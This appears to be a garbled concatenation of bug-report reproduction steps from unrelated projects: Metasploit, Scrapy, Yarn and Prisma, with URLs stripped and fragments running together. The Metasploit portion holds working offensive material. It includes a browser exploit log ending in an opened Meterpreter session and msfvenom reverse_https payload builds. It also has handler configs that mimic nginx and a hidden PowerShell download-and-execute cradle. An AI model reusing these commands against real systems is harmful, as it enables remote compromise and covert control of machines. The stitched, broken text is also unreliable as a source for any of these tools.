[07/13/2016 13:11:18] [e(0)] core: the accept() returned nil in stream server listener monitor: #<socket:fd 24>
[07/13/2016 13:11:19] [e(0)] core: the accept() returned nil in stream server listener monitor: #<socket:fd 24>
[07/13/2016 13:11:19] [e(0)] core: the accept() returned nil in stream server listener monitor: #<socket:fd 24>
[07/13/2016 13:50:35] [e(0)] rex: proc::on_request: client closed connection prematurely
[07/13/2016 14:09:43] [e(0)] core: error in stream server client monitor: connection timed out call stack:
/usr/share/metasploit-framework/lib/rex/socket/ssl_tcp.rb:240:in `sysread'
/usr/share/metasploit-framework/lib/rex/socket/ssl_tcp.rb:240:in `read'
/usr/share/metasploit-framework/lib/rex/proto/http/server.rb:295:in `on_client_data'
/usr/share/metasploit-framework/lib/rex/proto/http/server.rb:161:in `block in start'
/usr/share/metasploit-framework/lib/rex/io/stream_server.rb:48:in `on_client_data'
/usr/share/metasploit-framework/lib/rex/io/stream_server.rb:192:in `block in monitor_clients'
/usr/share/metasploit-framework/lib/rex/io/stream_server.rb:190:in `each'
/usr/share/metasploit-framework/lib/rex/io/stream_server.rb:190:in `monitor_clients'
/usr/share/metasploit-framework/lib/rex/io/stream_server.rb:73:in `block in start'
/usr/share/metasploit-framework/lib/rex/thread_factory.rb:22:in `block in spawn'
/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
[07/13/2016 15:03:19] [e(0)] rex: failed to find handler for resource: /robots.txt
[07/13/2016 16:56:34] [d(0)] core: session 44 did not respond to validation request rex::timeouterror: operation timed out.
[07/13/2016 17:13:17] [e(0)] core: error in stream server server monitor: no route to host - ssl_accept call stack:
/usr/share/metasploit-framework/lib/rex/socket/ssl_tcp_server.rb:71:in `accept'
/usr/share/metasploit-framework/lib/rex/socket/ssl_tcp_server.rb:71:in `accept'
/usr/share/metasploit-framework/lib/rex/io/stream_server.rb:147:in `monitor_listener'
/usr/share/metasploit-framework/lib/rex/io/stream_server.rb:70:in `block in start'
/usr/share/metasploit-framework/lib/rex/thread_factory.rb:22:in `block in spawn'
/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
## info metasploit version:
4.12.12-dev os:
linux k 4.5.0-kali1-amd64 #1 smp debian 4.5.5.-1kali1 (2016-06-06) x86_64 gnu/linux
configure and start exploits/multi/browser/firefox_proto_crmfrequest.rb on
install firefox 14
configure dns entry for test.nil to point to 10.0.0.1
using the vulnerable ffox install, navigate to get shell, be happy: ```
msf exploit(firefox_proto_crmfrequest) > jobs -v jobs
==== id name payload payload opts uripath start time handler opts -- ---- ------- ------------ ------- ---------- ------------ 0 auxiliary: spoof/dns/native_spoofer 2016-07-14 01:31:42 -0400 8 exploit: multi/browser/firefox_proto_crmfrequest windows/meterpreter/reverse_http / 2016-07-14 01:58:32 -0400 msf exploit(firefox_proto_crmfrequest) > [*] no cookie received for 10.0.0.3, resorting to headers hash.
[*] gathering target information for 10.0.0.3
[*] sending html response to 10.0.0.3
[*] info receiver page called from 10.0.0.3
[*] received cookie 'ibiiipxgjrogso' from 10.0.0.3
[*] received sniffed browser data over post from 10.0.0.3
{"os_name"=>["windows 7"], "os_vendor"=>["undefined"], "os_device"=>["undefined"], "ua_name"=>["firefox"], "ua_ver"=>["14.0"], "arch"=>["x86"], "java"=>["null"], "silverlight"=>["false"], "flash"=>["null"], "vuln_test"=>["true"]}.
[-] target 10.0.0.3 has requested an unknown path: /favicon.ico
[*] received cookie 'ibiiipxgjrogso' from 10.0.0.3
[*] serving exploit to user 10.0.0.3 with tag ibiiipxgjrogso
[*] setting target "ibiiipxgjrogso" to :tried.
[*] comparing requirement: source=script vs source=script
[*] comparing requirement: ua_name=firefox vs ua_name=firefox
[*] comparing requirement: ua_ver=#<proc: @/usr/share/metasploit-framework/modules/exploits/multi/browser/firefox_proto_crmfrequest.rb:56 (lambda)> vs ua_ver=14.0
[*] sending html
[-] target 10.0.0.3 has requested an unknown path: /favicon.ico
[*] received cookie 'ibiiipxgjrogso' from 10.0.0.3
[*] serving exploit to user 10.0.0.3 with tag ibiiipxgjrogso
[*] setting target "ibiiipxgjrogso" to :tried.
[*] comparing requirement: source=script vs source=script
[*] comparing requirement: ua_name=firefox vs ua_name=firefox
[*] comparing requirement: ua_ver=#<proc: @/usr/share/metasploit-framework/modules/exploits/multi/browser/firefox_proto_crmfrequest.rb:56 (lambda)> vs ua_ver=14.0
[*] sending the malicious addon
[*] handling request from 10.0.0.3; (uuid: er1zuppe) staging native payload...
[*] meterpreter session 4 opened (10.0.0.1:8080 -> 10.0.0.3:49295) at 2016-07-14 02:02:32 -0400
``` 5 navigate to the dns hostname configured, and be sad: ```
[*] no cookie received for 10.0.0.3, resorting to headers hash.
[*] gathering target information for 10.0.0.3
[*] sending html response to 10.0.0.3
[*] info receiver page called from 10.0.0.3
[*] received cookie 'focmaew' from 10.0.0.3
[*] received sniffed browser data over post from 10.0.0.3
{"os_name"=>["windows 7"], "os_vendor"=>["undefined"], "os_device"=>["undefined"], "ua_name"=>["firefox"], "ua_ver"=>["14.0"], "arch"=>["x86"], "java"=>["null"], "silverlight"=>["false"], "flash"=>["null"], "vuln_test"=>["true"]}.
[-] target 10.0.0.3 has requested an unknown path: /favicon.ico
[*] received cookie 'focmaew' from 10.0.0.3
[*] serving exploit to user 10.0.0.3 with tag focmaew
[*] setting target "focmaew" to :tried.
[*] comparing requirement: source=script vs source=script
[*] comparing requirement: ua_name=firefox vs ua_name=firefox
[*] comparing requirement: ua_ver=#<proc: @/usr/share/metasploit-framework/modules/exploits/multi/browser/firefox_proto_crmfrequest.rb:56 (lambda)> vs ua_ver=14.0
[*] sending html
[-] target 10.0.0.3 has requested an unknown path: /favicon.ico
[-] target 10.0.0.3 has requested an unknown path: /favicon.ico
[-] target 10.0.0.3 has requested an unknown path: /favicon.ico
[*] no cookie received for 10.0.0.3, resorting to headers hash.
[*] serving exploit to user 10.0.0.3 with tag 46038857eff739752bfbbd54fb86f467
[*] browsing visiting directly to the exploit url is forbidden.
``` in this case, dns is being provided by the spoofer in #6611, but given that the redirection occurs, its highly unlikely to be related
quick look through _lib/msf/core/exploit/remote/browser_exploit_server.rb_ did not yield significant insight other than that the tag is wrong for some reason on the second request
target info also seems to be missing a bit of data, not sure if its related.
create a module, and register and start a metasploit tftp server (code adapted from exploits/linux/http/linksys_wrt160nv2_apply_exec.rb): downfile = rand_text_alpha_lower(2 + rand(4)) filename = rand_text_alpha_lower(2 + rand(4)) @pl = generate_payload_exe print_status("#{peer} - starting up our tftp service") @tftp = rex::proto::tftp::server.new @tftp.register_file(downfile,@pl,true) @tftp.start
start metasploit framework as normal, and run the module.
try to connect to the tftp server using the tftp client, or using some ruby / metasploit client code.
- get the latest version of metasploit from github
- create a reverse_https handler ```
use exploit/multi/handler set payload windows/meterpreter/reverse_https
set lhost 192.168.0.4
set lport 443
- create an exe payload with msfvenom ```
msfvenom -p windows/meterpreter/reverse_https -f exe --platform windows -a x86 -e generic/none lhost=192.168.0.4 lport=443 luri=/ > ~/toolbox/utils/output.exe ```
- run the output.exe in a windows system (i used windows 7 sp1)
get the latest version of metasploit ;)
create a reverse_http handler (or any other handler derived from it, such as reverse_https)
my msfconsole resource file: ```
setg prompt "%t - 172.16.145.182 (s:%s j:%j) msf"
spool /root/.msf-spool.log
setg autosysteminfo false
setg verbose true
setg enablestageencoding true
setg consolelogging true setg loglevel 5 setg sessionlogging true setg timestampoutput true
setg store_loot true
setg lhost 172.16.145.182 set sessioncommunicationtimeout 3600
set prependmigrate true
set prependmigrateprocess explorer.exe
set exitonsession false
setg meterpreteruseragent mozilla/5.0 (windows nt 6.1; trident/7.0; rv:11.0) like gecko
setg httpunknownrequestresponse <html><head><title>403 forbidden</title></head><body bgcolor="white"><center><h1>403 forbidden</h1></center><hr><center>nginx</center></body></html>
setg meterpreterservername nginx use multi/handler
set payload windows/meterpreter/reverse_https
set lport 443
make sure the `httpunknownrequestresponse` option is specified
send a request to the handler on any url (other than for the payload itself)
the request is showing in the console, but no response is sent
example output from console: ```
2016-07-01 09:52:40 +0100 - 172.16.145.182 (s:0 j:1) msf exploit(handler) > [*] [2016.07.01-09:52:40] started https reverse handler on
[*] [2016.07.01-09:52:40] starting the payload handler...
2016-07-01 09:52:40 +0100 - 172.16.145.182 (s:0 j:1) msf exploit(handler) > [*] [2016.07.01-09:53:17] handling request from 172.16.145.1; (uuid: iwwbl0ga) unknown request to /asdfd with ua 'curl/7.30.0'
the database system is not starting on os x el captian.
i am having the following error:
`[-] failed to connect to the database: fatal: the database system is shutting down
`` i need help to start postgres on os x with the free nightly package installer, i don't know how the postgres was installed with this package, so i don't know how to restart this
thank you in advice!
## system stuff
### os what os are you running metasploit on? os x el captian
use the wp_wysija_newsletters_upload exploit
with the payload php/meterpreter/reverse_tcp the exploit works (on a lab vulnerable wordpress)
with the payload php/bind_php, the exploit fails because there is no php tag on the uploaded file (<?php and ?>), so the web server does not execute the php code
directing target browser to autopwn uri recreates this for me
try to use the x64/xor stage encoder in multi/handler for any x64 windows meterpreter payload
it doesn't work and falls back to no encoding
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set exitonsession false
set lhost 192.168.1.100
set lport 554
set enablestageencoding true
set stageencoder x64/xor
i am trying to inject shellcode to a remote process with python
i actually need to use windows/meterpreter/reverse_https_proxy because of the custom proxy option
the payload crashes the remote process and this is not the only one
every single payload of the payloads below crash the remote procs.
windows/meterpreter/reverse_https_proxy
windows/meterpreter/reverse_https
windows/meterpreter/reverse_http
windows/meterpreter/reverse_tcp the only payloads that work as they should, are the stageless ones, like meterpreter_reverse_http(s) and meterpreter_reverse_tcp
i double checked every possible solution, i even double checked my framework version and force updated it but with no luck.
run autopwn2 and it happens with every connection attempt: [-] exception handling request: undefined local variable or method `expires' for #<msf::modules::mod617578696c696172792f7365727665722f62726f777
365725f6175746f70776e32::metasploitmodule: > rsions.
open a meterpreter session and try to use the upload command to send a file
from msf: ```
use exploit/multi/script/web_delivery
set target 2
set payload windows/x64/meterpreter/reverse_tcp
set uripath update
set lhost 0.0.0.0
set lport 8081
``` on target:
`powershell.exe -nop -w hidden -c $z=new-object net.webclient;$z.proxy=[net.webrequest]::getsystemwebproxy();$z.proxy.credentials=[net.credentialcache]::defaultcredentials;iex $z.downloadstring(' ` target info:
windows 7 sp1, powershell 2.0, windows firewall disabled
windows 8.1, powershell 4.0, windows firewall disabled
open a reverse_https stager
stage > load powershell
> powershell_import /usr/share/powertools/powerup/powerup.ps1
meterpreter > run post/windows/gather/win_privs
in msfconsole:
`hosts -s something` it spits out this error: ```
currently, active record recognizes the table in the string, and knows to join the comments table to the query, rather than loading comments in a separate query
however, doing this without writing a full-blown sql parser is inherently flawed
since we don't want to write an sql parser, we are removing this functionality
from now on, you must explicitly tell active record when you are referencing a table from a string: post.includes(:comments).where("comments.title = \'foo\'").references(:comments) ```
use exploit/multi/browser/java_jre17_jmxbean_2
set payload java/meterpreter/reverse_tcp
set lhost 192.168.1.100
set lport 443
set srvhost 192.168.1.100
set srvport 8080
exploit -j or: same exploit using setoolkit
also tried with reverse_http and reverse_https ....same results victim machine 1: android 4.3 on virtualbox
victim machine 2: windows 7 on virtualbox
## cat ~/.msf4/logs/framework.log gives me this output:
## screenshot ![screenshot from 2016-03-22 12 43 01](
create meterpreter session and pivot a route over it containing one of its l3 interface addresses
create a udp socket locally - rex::socket::udp.create with a localhost of 127.0.0.1
write connect another udp socket to the local one and write data such that the first socket has something in its read bufffer.
call io.select with the pending socket as the first argument, see it return the waiter array.
repeat the udp socket pair creation steps on the remotely pivoted l3 address of the compromised host (see rc script in #6692).
repeat the io.select op on the pivot sockets
enjoy the stack trace.
set exename with your exe file you have
exploit rsions.
## connection string ```
[*] successfully loaded plugin: pro
msf-pro > db_status
[*] postgresql connected to metasploit_credentials
msf-pro > db_connect msf:pass123@localhost:5432/metasploit_pro_master
msf-pro > db_status
[*] postgresql connected to metasploit_credentials
### yaml ```
$ cat /tmp/config.yml
production: adapter: postgresql username: msf password: pass123 host: localhost port: 5432 pool: 50 timeout: 5 database: metasploit_credentials
msf-pro > db_status
[*] postgresql connected to metasploit_pro_master
msf-pro > db_connect -y /tmp/config.yml
msf-pro > db_status
[*] postgresql connected to metasploit_pro_master
### help text, help more! ```
msf-pro > help db_connect
[*] usage: db_connect <user:pass>@<host:port>/<database>
[*] or: db_connect -y [path/to/database.yml]
[*] examples:
[*] db_connect user@metasploit3
[*] db_connect user:pass@192.168.0.2/metasploit3
[*] db_connect user:pass@192.168.0.2:1500/metasploit3
(tested against 7d4c4c36588c0cffa4f2a6de22d6613c9a115241)
- start msfconsole
- run an msgrpc server ```
$ ./msfconsole -n -q
[-] * warning: database support has been disabled
msf > load msgrpc serverport=23234 pass=12345
[*] msgrpc service: 127.0.0.1:23234 [*] msgrpc username: msf
[*] msgrpc password: 12345
[*] successfully loaded plugin: msgrpc
- in a different window, run the msfrpc_irb.rb script from the msfrpc-client gem.
- call module.options("auxiliary", "scanner/http/scraper") ```
$ ./msfrpc_irb.rb --rpc-host 127.0.0.1 --rpc-port 23234 --rpc-user msf --rpc-pass 12345 --rpc-ssl false
[*] the rpc client is available in variable 'rpc'
[*] sucessfully authenticated to the server
[*] starting irb shell...
>> rpc.call("module.options","auxiliary","scanner/http/scraper")
runtimeerror: nil from /home/henryk/.rvm/gems/ruby-1.9.3-p547@metasploit-framework/gems/msfrpc-client-1.0.2/lib/msfrpc-client/client.rb:100:in `call' from (irb):2:in `<main>' from /home/henryk/.rvm/gems/ruby-1.9.3-p547@metasploit-framework/gems/librex-0.0.999/lib/rex/ui/text/irb_shell.rb:53:in `block in run' from /home/henryk/.rvm/gems/ruby-1.9.3-p547@metasploit-framework/gems/librex-0.0.999/lib/rex/ui/text/irb_shell.rb:52:in `catch' from /home/henryk/.rvm/gems/ruby-1.9.3-p547@metasploit-framework/gems/librex-0.0.999/lib/rex/ui/text/irb_shell.rb:52:in `run'
## actual results
- the rpc call raises a runtimeerror.
- looking at the network traffic shows: http connection is closed after the request with no response
- no error messages are visible in the msfconsole
## expected results
- a hash should have been returned
or at least an rpc exception.
create pipeline with an csv item exporter
only export few items (one or two)
let spider close/finish
this is also reproducible using the bundled ftp downloader 1
``scrapy startproject scrapy_test``
``scrapy genspider example mozz.us``
add ``dns_resolver = "scrapy.resolver.cachinghostnameresolver"`` to the settings file
change the spider start_url to ``ftp://mozz.us``
``scrapy crawl scrapy_test``
get website cookies that aren't formatted properly (so a key with an empty value: eg
pass the cookie to scrapy and see the request not go through
use the response.follow function
go to
try to follow the "kontakt & impressum" page
it redirects to " " which is incorrect
the <base> element is commented out
installed anaconda + openssl
use conda install -c conda-forge scrapy
get error when type scrapy on cmd
create clean project
add sample spider from additional section
run with spider callback raise exception and yield {} (or any request)
run with spider callback raise exception 5
compare the number of log output for middleware's process_spider_exception method
create 2 conda environments one scrapy160 with scrapy 1.6.0 version installed and scrapy230 with scrapy 2.3.0
version installed.
`conda activate scrapy160`
`scrapy startproject test_login`
`cd test_login`
`scrapy genspider login quotes.toscrape.com/login`
adapt login.py ```
import scrapy
from scrapy import formrequest class loginspider(scrapy.spider): name = \'login\' # allowed_domains = [\'quotes.toscrape.com\'] start_urls = [\' def parse(self, response): csrf_token = response.xpath(\'//input[@name="csrf_token"]/@value\').get() return formrequest.from_response( response, # formname=\'\', # formcss=\'\', formxpath=\'//form\', formdata={ \'csrf_token\': csrf_token, \'username\': \'admin\', \'password\': \'admin\' }, callback=self.after_login ) def after_login(self, response): logout = response.xpath("//a[text()=\'logout\']/text()").get() self.logger.info(logout)
`scrapy crawl login`
`conda activate scrapy230`
`scrapy crawl login`
(using poetry) 1
enter new project directory
`poetry init -n`
`poetry config virtualenvs.in-project true --local`
`poetry add scrapy`
`poetry shell`
`scrapy startproject scraper .`
`scrapy` <-- fails
`python` <-- fails
set `log_cli = true` in pytest.ini
run `tox -e py -- tests/test_scheduler.py -k test_integration_downloader_aware_priority_queue`
create a `test.py` file with [this spider](
`scrapy runspider test.py -l info`
create a `test.py` file with this [spider and settings](
`scrapy runspider test.py -l info`
create a file with the following contents:
# asyncio_spider.py
import asyncio from scrapy import spider class asynciospider(spider): name = "asyncio" start_urls = [" "] custom_settings = { "twisted_reactor": "twisted.internet.asyncioreactor.asyncioselectorreactor", } async def parse(self, response): await asyncio.sleep(1) yield {"foo": "bar"}
execute the spider: `scrapy runspider asyncio_spider.py`
define a sitemapspider, set a target site:
sitemap_urls = [ r'
define a `jobdir=jobs` in `settings.py`, 2
stop spider 4
run spider again
create `is_generator_bug.py` with the content below (which i simplified from [the `is_generator_with_return_value` method body]( #l186-l187)
run `python is_generator_bug.py`
observe the kaboom ```python
import inspect
from textwrap import dedent
class bob: def doit(self): """
this line is flush left """ if true: yield 1234 if __name__ == \'__main__\': b = bob() c = b.doit if inspect.isgeneratorfunction(c): tree = ast.parse(dedent(inspect.getsource(c)))
here is the code:
# -*- coding: utf-8 -*-
import scrapy
class testspider(scrapy.spider): name = \'test\' # 49.235.192.63:443 start_urls = [\' ] handle_httpstatus_list = [i for i in range(199, 600)] # handle all response def parse(self, response): if response.certificate: cert = response.certificate.inspect() else: cert = "" print("cert is --->", cert)
class spider(scrapy.spider): def parse(self, response): yield from response.follow_all([], self.parse)
running command
>>> scrapy parse --spider=quotes3
the `quotes3` spider shows below dditional context
clone this repo : `git clone `
run the spider : `scrapy crawl examples`
if you run it several times, the filespipeline has the right behavior : it does not download uptodate files ```
2020-02-19 14:41:36 [scrapy.pipelines.files] debug: file (uptodate): downloaded file from <get referred in <none>
2020-02-19 14:41:36 [scrapy.pipelines.files] debug: file (uptodate): downloaded file from <get referred in <none>
2020-02-19 14:41:36 [scrapy.pipelines.files] debug: file (uptodate): downloaded file from <get referred in <none>
now change the `file_store` in `settings.py` to a gcs bucket `files_store = 'gs://mybucket/' ` 5
if you then run the spider several times, the files are downloaded everytime : ```
2020-02-19 14:50:44 [scrapy.pipelines.files] debug: file (downloaded): downloaded file from <get referred in <none>
2020-02-19 14:50:44 [urllib3.connectionpool] debug: "post /upload/storage/v1/b/cdcscrapingresults/o?uploadtype=multipart http/1.1" 200 843
2020-02-19 14:50:44 [scrapy.core.engine] debug: crawled (200) <get (referer: none)
2020-02-19 14:50:44 [scrapy.pipelines.files] debug: file (downloaded): downloaded file from <get referred in <none>
2020-02-19 14:50:44 [scrapy.core.scraper] debug: scraped from <200
fresh anaconda install, installed scrapy with `conda install -c conda-forge scrapy`, as specified in [official windows installation instructions]( #windows)
scrapy 1.8.0 was successfully installed
enter a scrapy command: `scrapy shell`, `scrapy version`, `scrapy startproject spam`, etc.
create spider middleware with defined `process_spider_exception`
put it into `spider_middlewares` with number more than `900` (to make it first)
raise an exception in a spider callback
yield an item from the callback
from this url
we can get this link (text is `pdf 1692 kb`).
it redirects to
- scrapy startproject test_spider
- cd test_spider
- scrapy genspider example example.com
- modify spiders/example.py to ```
# -*- coding: utf-8 -*-
import scrapy class examplespider(scrapy.spider): name = 'example' allowed_domains = ['example.com'] start_urls = [' custom_settings = { 'item_pipelines': { 'test_spider.pipelines.testspiderpipeline': 300 } } def parse(self, response): pass
- modify pipelines.py to ```
# -*- coding: utf-8 -*- # define your item pipelines here
# don't forget to add your pipeline to the item_pipelines setting
# see: class testspiderpipeline(object): def open_spider(self, spider): raise exception('error') def process_item(self, item, spider): return item
- scrapy crawl example
scrapy " " with version1.8 scrapy
navigate to #the-network-tool
click the link `quotes.toscrape.com/scroll` on end of first paragraph.
custom_settings = { "closespider_timeout": 60,
scrapy shell
set `stats_class = "scrapy.statscollectors.dummystatscollector"` in the settings module as described in the documentation ( #dummystatscollector).
run `scrapy check` with the following spider:
class cbkwargscontract(scrapy.spider): name = \'cb_kwargs_contract\' def start_requests(self): yield scrapy.request(" ", cb_kwargs={"arg1": "foo"}) def parse(self, response, arg1): """ @url """ self.logger.info(arg1)
from pprint import pprint from scrapy import field, item
from scrapy.loader import itemloader
from scrapy.loader.processors import takefirst class x(item): x = field(output_processor=takefirst()) loader = itemloader(x())
loader.add_value("x", ["value1", "value2"])
x = loader.load_item()
# {'x': 'value1'} pprint(itemloader(x).load_item())
# {'x': 'v'}
npm init -y
have your package.json like this:
{ "dependencies": { "node-fetch": "^1.0.0" }, "resolutions": { "node-fetch/encoding/iconv-lite": "0.4.15", "node-fetch/encoding": "0.1.12" }
i expect that `iconv-lite` package will be installed in version `0.4.15` for every direct dependency of `encoding` which is a direct dependency of `node-fetch` and that `encoding` will be installed in `0.1.12` if it is a direct dependency of `node-fetch`.
actually my yarn.lock looks as followos:
# this is an autogenerated file
do not edit this file directly.
# yarn lockfile v1 encoding@0.1.12, encoding@^0.1.11: version "0.1.12" resolved " #538b66f3ee62cd1ab51ec323829d1f9480c74beb" integrity sha1-u4tm8+5izrq1hsmjgp0flidhs+s= dependencies: iconv-lite "~0.4.13" iconv-lite@0.4.15: version "0.4.15" resolved " #fe265a218ac6a57cfe854927e9d04c19825eddeb" integrity sha1-/izaiyrgpxz+hukn6dbmgyje3es= iconv-lite@~0.4.13: version "0.4.24" resolved " #2022b4b25fbddc21d2f524974a474aafe733908b" integrity sha512-v3mxnzacvnywktuezomiactle7rxxeedor31wwl7vlyoxo4qi9arvsennqwne1tcrwhcl1hwli21beqdpj8/ra== dependencies: safer-buffer ">= 2.1.2 < 3" is-stream@^1.0.1: version "1.1.0" resolved " #12d4a3dd4e68e0b79ceb8dbc84173ae80d91ca44" integrity sha1-etsj3u5o4lec6428hbc66a2rykq= node-fetch@^1.0.0: version "1.7.3" resolved " #980f6f72d85211a5347c6b2bc18c5b84c3eb47ef" integrity sha512-nhz4cskx7cym2vsrbar2pvfoe6swdf0uylrqa6svuyg7+/tsfvau49jyc4bvq4sms9szgdqgbgroqfdhjdtykq== dependencies: encoding "^0.1.11" is-stream "^1.0.1" "safer-buffer@>= 2.1.2 < 3": version "2.1.2" resolved " #44fa161b0187b9549dd84bb91802f9bd8385cd6a" integrity sha512-yzo3k82sd7riyi0e1eqpojlz7kpepnsqi9iypbhhg1xxxevb5dji7tpyn2adxgcqbhg7vcyrhk0cbwqcqriutg== ```
so encoding package is fine but iconv-lite is not
is it a bug really? or i don't get something?
create an new directory with `package.json` consisting of just `{}`.
run `yarn policies set-version '^1.21.1'`
git clone my fork of yarn:
move to the newly created yarn directory.
execute: `yarn licenses generate-disclaimer > out.txt`
observe the character count of this `out.txt` file (460943).
execute: `node testspawn.js`
observe that the total character count of the data streams is only 7903 characters.
execute: `node testexec.js`
observe that the total character count of the data buffer is only 49961 characters.
execute: `node testcat.js`
observe that the total character count of the data buffer is exactly 460943 characters, the correct number
**expected behavior**
the character count from `node testspawn.js`, `node testexec.js`, and `node testcat.js` should all be identical to the character count of the `out.txt` file
**versions**
running latest stable yarn (0.21.3) (6e9a9a6596ca8f177f68f6672a1ef4ff16705336), installed globally
mac os 10.11.6 (15g1217)
node version 6.9.1
**additional info**
when testing my own project in which i discovered this issue, our build server (running some version of linux) produces still different output
it appears to output a different set of disclaimers, but still appears to be somewhat trimmed
no hard confirmation, however
also, it adds this to the top of the file which is not present when building on mac:
info "fsevents@1.0.17" is an optional dependency and failed compatibility check
excluding it from installation.
``` **theory** * could it be that yarn is triggering an end or close signal on the `child_process`?
* is yarn doing something that assumes it is being run from the command line, and not via a `child_process`?
* is there some kind of timeout on either the `child_process` (unlikely, i explicitly set a 10 second timeout, and the program ended prior to that duration).
* is there some kind of timeout on yarn's `generate-disclaimer` when run as a `child_process`?
try to deploy with this datamodel:
type test { dates: [datetime]
deployment:
![](
use typescript advanced boilerplate 2
make the following changes to prisma.yml
seed: run: yarn ts-node ./database/seed.ts
for any valid seed.ts file, the database is never reset when you run `prisma seed -r`
run `prisma introspect` against an existing psql database
the datamodel is wrong.
create a fresh build with postgres
compose file below: ```
version: '3'
services: prisma: image: prismagraphql/prisma:1.9 restart: always ports: - "4466:4466" environment: prisma_config: | port: 4466 # uncomment the next line and provide the env var prisma_management_api_secret=my-secret to activate cluster security # managementapisecret: my-secret databases: default: connector: postgres host: postgres port: 5432 user: prisma password: prisma migrations: true postgres: image: postgres restart: always ports: - "5432:5432" environment: postgres_user: prisma postgres_password: prisma volumes: - postgres:/var/lib/postgresql/data redis: image: redis ports: - "6379:6379" command: redis-server --appendonly yes volumes: - "redis-data:/data" volumes: postgres: redis-data:
-
- set it up for existing postgres db with data
- and open the graphql playground endpoint when complete
for example, take the following datamodel:
type affiliatecampaign @model { requirements: affiliaterequirement @relation(name: "requirementsforeachcampaign")
} type affiliaterequirement @model { campaign: affiliatecampaign @relation(name: "requirementsforeachcampaign")
if you change the name `requirementsforeachcampaign`, this happens.
a simple prisma setup in the master branch of the following repository generates the `generated` folder when running `prisma deploy`: on the other hand, it fails when you try it on the `generated` branch:
setup a blank mysql database
run `prisma init`
i can give you guys the database schema if that would be helpful.
1) install typescript-basic boilerplate
2) delete generated files
3) `prisma deploy`
create a datamodel with id of type int!.
my usecase is maybe strange, but nevertheless
i need to make a generic `graphqlschema` (`executable schema`) from `prisma` instance
here is a code snippet: ```js
export function getprismageneratedschema(driver: string = "mysql", generatedpath = "src/schema/generated"): string { // schema was previously written to file with schema print: // await introspectschema(new httplink({uri: prismaendpoint, fetch})); return fs.readfilesync(path.join(generatedpath, `${driver}.graphql`), "utf8");
} export function prismaexecutableschema( prismainstance: prisma, driver: string = "mysql", generatedpath = "src/schema/generated"
): graphqlschema { const typedefs = getprismageneratedschema(driver, generatedpath); return makeexecutableschema({ typedefs, resolvers: { query: prismainstance.query, mutation: prismainstance.mutation, subscription: prismainstance.subscription, } });
``` the problem is in `subscription` section:
eerror: subscription.articles defined in resolvers, but not in schema
``` schema contains subscriptions **only** on single objects (e.g
article, tag, category), while prisma instance contains resolvers also on collections (e.g
articles, tags, categories)
i have tried with different existing postgresql databases, local or remote, but i always get this error.
turn off wifi and try to deploy you get error for each step of deployment when trying to deploy to local prisma instance
i've got a [sample repo]( set up with my sdl + some seed data which demonstrates the issue, though it'd need to be deployed somewhere with a postgresql db to replicate
the working version deployed to the demo service is available here:
i copied over my sdl to a new project and reproduced the error there as well
* graphqlbin link to show incorrect queries: * repo with sdl : also worth noting i initially encountered the error while working with a local postgresql db, so it doesn't seem tied to local vs
remote or mysql vs
i've create a github repo which can be used to reproduce the issue:
follow the `prisma init` instructions ? set up a new prisma server or deploy to an existing server? create new database
? what kind of database do you want to deploy to? mysql just trying to leverage the default functionality to check this out with docker.
prisma init service-name
cd service-name
touch seed.graphql
echo \'mutation{createuser(data:{name:"a"}){id}}\' > seed.graphql
``` add this to `prisma.yml`: ```yml
seed: import: seed.graphql
``` ```console
prisma deploy
prisma seed
use this `prisma.yml` and run `prisma delete` while being logged in ```
endpoint:
datamodel: datamodel.graphql
create a postgres database with a 'users' table and a 'subscriptions' table using the `psql` commandline: create database prisma_test; \\c prisma_test create table users (id bigserial primary key, username text); create table posts (id bigserial primary key, title text, user_id bigint); alter table posts add constraint fk_user_id foreign key (user_id) references users(id); exit `psql` and then run `prisma init`
the resulting schema: type posts @pgtable(name: "posts") { id: int! title: string user: users @pgrelation(column: "user_id") } type users @pgtable(name: "users") { id: int! username: string postss: [posts!]! }
run `prisma export` on local enpoint server and get the `export.zip` file
run `prisma import -d export.zip` to prisma cloud endpoint
got error on the console ``` "task slick.basic.basicbackend$databasedef$$anon$2@445365c8 rejected from slick.util.asyncexecutor$$anon$2$$anon$1@6aa95118[running, pool size = 10, active threads = 10, queued tasks = 1000, completed tasks = 98098]", "task slick.basic.basicbackend$databasedef$$anon$2@358c9655 rejected from slick.util.asyncexecutor$$anon$2$$anon$1@6aa95118[running, pool size = 10, active threads = 10, queued tasks = 1000, completed tasks = 98098]", "task slick.basic.basicbackend$databasedef$$anon$2@7c610941 rejected from slick.util.asyncexecutor$$anon$2$$anon$1@6aa95118[running, pool size = 10, active threads = 10, queued tasks = 1000, completed tasks = 98098]", "task slick.basic.basicbackend$databasedef$$anon$2@5725ecb9 rejected from slick.util.asyncexecutor$$anon$2$$anon$1@6aa95118[running, pool size = 10, active threads = 10, queued tasks = 1000, completed tasks = 98098]", "task slick.basic.basicbackend$databasedef$$anon$2@807aeb0 rejected from slick.util.asyncexecutor$$anon$2$$anon$1@6aa95118[running, pool size = 10, active threads = 10, queued tasks = 1000, completed tasks = 98098]", "task slick.basic.basicbackend$databasedef$$anon$2@5968bfdb rejected from slick.util.asyncexecutor$$anon$2$$anon$1@6aa95118[running, pool size = 10, active threads = 10, queued tasks = 1000, completed tasks = 98098]", "task slick.basic.basicbackend$databasedef$$anon$2@2db78eb6 rejected from slick.util.asyncexecutor$$anon$2$$anon$1@6aa95118[running, pool size = 10, active threads = 10, queued tasks = 1000, completed tasks = 98098]", "task slick.basic.basicbackend$databasedef$$anon$2@550fef9d rejected from slick.util.asyncexecutor$$anon$2$$anon$1@6aa95118[running, pool size = 10, active threads = 10, queued tasks = 1000, completed tasks = 98098]", "task slick.basic.basicbackend$databasedef$$anon$2@60c8a9a2 rejected from slick.util.asyncexecutor$$anon$2$$anon$1@6aa95118[running, pool size = 10, active threads = 10, queued tasks = 1000, completed tasks = 98100]", "task slick.basic.basicbackend$databasedef$$anon$2@7cc25407 rejected from slick.util.asyncexecutor$$anon$2$$anon$1@6aa95118[running, pool size = 10, active threads = 10, queued tasks = 999, completed tasks = 98100]", "task slick.basic.basicbackend$databasedef$$anon$2@6d91b717 rejected from slick.util.asyncexecutor$$anon$2$$anon$1@6aa95118[running, pool size = 10, active threads = 10, queued tasks = 1000, completed tasks = 98104]"
**what i did to make it work** unzip `export.zip` split `000001.json` from `lists` folder to 5 or 6 pieaces
run `prisma reset` and `prisma import -d export-folder` and it should work.
npm install -g prisma@1.7.4
prisma init test
